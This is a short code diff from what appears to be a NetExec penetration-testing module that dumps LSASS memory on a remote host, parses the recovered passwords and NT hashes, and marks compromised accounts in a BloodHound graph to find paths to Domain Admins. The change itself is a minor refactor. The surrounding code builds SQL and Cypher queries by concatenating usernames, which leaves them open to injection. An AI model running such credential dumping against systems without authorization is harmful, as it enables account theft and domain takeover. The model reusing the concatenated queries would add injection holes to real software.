@@ -70,11 +70,7 @@ def create_db(local_admins, dbconnection, cursor):
 
 
 def process_creds(context, connection, credentials_data, dbconnection, cursor, driver):
-    if connection.args.local_auth:
-        context.log.extra["host"] = connection.conn.getServerDNSDomainName()
-    else:
-        context.log.extra["host"] = connection.domain
-    context.log.extra["hostname"] = connection.host.upper()
+    domain = connection.conn.getServerDNSDomainName() if connection.args.local_auth else connection.domain
     for result in credentials_data:
         username = result["username"].upper().split("@")[0]
         nthash = result["nthash"]
@@ -85,7 +81,7 @@ def process_creds(context, connection, credentials_data, dbconnection, cursor, d
                 "UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'",
                 [password],
             )
-            username = f"{username.upper()}@{context.log.extra['host'].upper()}"
+            username = f"{username.upper()}@{domain.upper()}"
             dbconnection.commit()
             session = driver.session()
             session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
@@ -99,7 +95,7 @@ def process_creds(context, connection, credentials_data, dbconnection, cursor, d
                 [nthash],
             )
             dbconnection.commit()
-            username = f"{username.upper()}@{context.log.extra['host'].upper()}"
+            username = f"{username.upper()}@{domain.upper()}"
             session = driver.session()
             session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
             path_to_da = session.run("MATCH p=shortestPath((n)-[*1..]->(m)) WHERE n.owned=true AND m.name=~ '.*DOMAIN ADMINS.*' RETURN p")
@@ -202,7 +198,7 @@ class NXCModule:
         if file is None:
             context.log.fail("Unable to dump lsass")
             return False
-        credentials, tickets, masterkeys = Parser(file).parse()
+        credentials, tickets, masterkeys = Parser(host, file).parse()
         file.close()
         ImpacketFile.delete(session, file.get_file_path())
         if credentials is None:
